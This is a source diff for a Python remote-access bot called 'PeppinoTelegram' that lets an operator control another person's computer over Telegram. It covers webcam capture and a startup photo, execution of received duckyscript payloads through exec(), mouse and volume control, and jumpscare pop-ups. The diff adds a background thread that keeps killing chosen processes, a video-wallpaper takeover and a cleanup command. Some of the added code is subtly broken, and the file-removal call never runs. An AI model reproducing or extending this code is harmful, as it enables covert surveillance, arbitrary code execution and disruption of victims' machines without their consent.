@@ -12,7 +12,8 @@ from PIL import Image
 from cv2 import (VideoWriter, VideoCapture, imwrite, imshow, imread, resize, waitKey,
                  setWindowProperty, WND_PROP_TOPMOST, cvtColor, COLOR_BGR2RGB, VideoWriter_fourcc,
                  destroyAllWindows, WND_PROP_FULLSCREEN, WINDOW_FULLSCREEN, namedWindow, Mat, 
-                 CAP_PROP_FRAME_WIDTH, CAP_PROP_FRAME_HEIGHT, dnn, bitwise_not, INTER_LINEAR, BORDER_REFLECT, remap, destroyWindow)
+                 CAP_PROP_FRAME_WIDTH, CAP_PROP_FRAME_HEIGHT, dnn, bitwise_not, INTER_LINEAR, BORDER_REFLECT, remap,
+                 destroyWindow, destroyAllWindows)
 
 #MERGE AUDIO&VIDEO
 from moviepy.editor import AudioFileClip, VideoFileClip
@@ -75,11 +76,20 @@ HOME_PATH = getenv("USERPROFILE") if iswindows else getenv("HOME")
 BURN_DIRECTORY = join(HOME_PATH, ".cache")
 MOUSE_JMP = 50
 
-vfx = abspath(join(cwd_folder, "vfx"))
-sfx = abspath(join(cwd_folder, "sfx"))
+#vfx = abspath(join(cwd_folder, "vfx"))
+#sfx = abspath(join(cwd_folder, "sfx"))
+#
+#prototxt_filename = join(cwd_folder, 'model', '1.prototxt')
+#caffemodel_filename = join(cwd_folder, 'model', '2.caffemodel')
 
-prototxt_filename = join(cwd_folder, 'model', '1.prototxt')
-caffemodel_filename = join(cwd_folder, 'model', '2.caffemodel')
+try:
+    vfx = resource_path("vfx")
+    sfx = resource_path("sfx")
+    prototxt_filename = resource_path(join("model","1.prototxt"))
+    caffemodel_filename = resource_path(join("model","2.caffemodel"))
+except Exception as e:
+    print(e)
+    exit()
 
 def randomname(lenght: int=10) -> str:
     return "".join([ choice(ascii_letters) for _ in range(lenght)])
@@ -166,9 +176,14 @@ mousecontroller - Sends a mouse controlling menu.
 mute - Set computer's volume to 0.
 full - Set computer's volume to 100.
 tralalerotralala - Plays italian brainrot.
+cantopenadd - Adds process to cantopenlist.
+cantopenremove - Removes process from cantopenlist.
+cantopenmenu - Displays processes on cantopenlist, clicking them will remove them.
+clear - Removes all cv2 windows, closes webcam and removes temporary files.
 
 *sending a photo* - Displays the photo on the screen as a pop-up.
 *sending a photo with "/jumpscare" caption* - Will create a jumpscare with that photo.
+*sending a video with /setvideowallpaper as caption will play it as wallpaper(dont use long videos).
 *sending an audio/voice* - Will play the audio/voice in the background.
 *sending a file that ends with '.dd' - will execute it as duckyscript. (send /duckyhelp to get commands)
 
@@ -630,11 +645,12 @@ class PeppinoTelegram:
         self.help = HELP
         self.page = 0
         self.owner_name = ""
+        self.cap = capture
         self.bot = Bot(token) 
+        self.cantopenlist = []
         self.duckyhelp = DUCKYHELP
         self.explorer_path = getcwd()
         self.audio_mixer = mixer
-        self.cap = capture
         self.process_explorer_menu = None
         self.explorer_message = None
         #converts text to functions
@@ -678,6 +694,10 @@ class PeppinoTelegram:
             "fullvolume":lambda:self.audio_mixer.full(),
             "camerawallpaper":self.setCameraAsWallpaper,
             "mousecontroller":self.mousecontroller,
+            "cantopenmenu":self.cantopenmenu,
+            "cantopenadd":self.cantopen,
+            "cantopenremove":self.removefromcantopen,
+            "clear":self.clear,
             "mouser":self.mouser,
             "mousel":self.mousel,
             "mouseu":self.mouseu,
@@ -1319,6 +1339,12 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
                 self.bsend("Use /processkiller first")
         else:
             self.bsend(f"Invalid command {command}")
+
+    def clear(self) -> None:
+        self.closecap()
+        map(remove, listdir(BURN_DIRECTORY))
+        destroyAllWindows()
+        self.audio_mixer.mute()
     
     def parse_document(self, msg: str) -> None:
         document = msg["document"]
@@ -1335,6 +1361,19 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
             self.bsend(f"Executing duckyscript {filename}({saved_filename})")
             exec(payload_python)
             remove(saved_filepath)
+
+        elif filename.endswith(".mp4"):
+            caption = msg["caption"]
+            old_wallpaper = backup_wallpaper("backup_wallpaper.png")
+            if caption == "/setvideowallpaper":
+                video_stream = VideoCapture(saved_filepath)
+                res = True
+                while res:
+                    res, frame = video_stream.read()
+                    imwrite("tmp.png", frame)
+                    change_wallpaper(abspath("tmp.png"))
+                    remove("tmp.png")
+                change_wallpaper(old_wallpaper)
         
     def handle(self, msg: str) -> None:
         content_type, chat_type, chat_id = glance(msg)
@@ -1351,6 +1390,28 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
                 self.parse_audio(msg)
         else:
             self.bsend(f"What do you want {sender_name}, I don't work for you.")
+
+    def cantopen(self, process: str) -> None:
+        self.cantopenlist.append(process)
+        self.bsend(f"Added {process} to cantopenlist.")
+
+    def removefromcantopen(self, process: str) -> None:
+        self.cantopenlist.remove(process)
+        self.bsend(f"Removed {process} to cantopenlist.")
+
+    def cantopenmenu(self) -> None:
+        if self.cantopenlist:
+            dict_menu = { proc:f"/cantopenremove {proc}" for proc in self.cantopenlist}
+            menu = self.new_menu(dict_menu)
+        else:
+            self.bsend("cantopenlist is empty.")
+    
+    def cantopenkiller(self) -> None:
+        while True:
+            for process in self.cantopenlist:
+                if self.check_if_proc_running(process):
+                    self.terminate_process_by_name(process)
+            sleep(1)
     
     def extract_commands(self) -> list[dict]:
         commands = findall(r'^([a-zA-Z0-9_]+) - (.*)', self.help, M)
@@ -1371,8 +1432,13 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
         self.update_commands()
         self.images = load_images()
         self.audios = load_audios()
-        if not self.selphie(f"Bot started: "+now()):
-            self.bsend(f"Bot started: {now}")
+        self.cantopenthread = Thread(target=self.cantopenkiller)
+        self.cantopenthread.start()
+        if not sys.argv[1:]:
+            if not self.selphie(f"Bot started: "+now()):
+                self.bsend(f"Bot started: {now()}")
+        else:
+            self.bsend(f"Bot started: {now()}")
         loop = MessageLoop(self.bot, {"chat":self.handle, "callback_query":self.on_callback_query})
         loop.run_as_thread()
         while 1:
@@ -1380,6 +1446,7 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
                 sleep(0.01)
             except KeyboardInterrupt:
                 self.bsend("Interrupted by host, bye bye")
+                self.clear()
                 break
 
 if __name__ == "__main__":
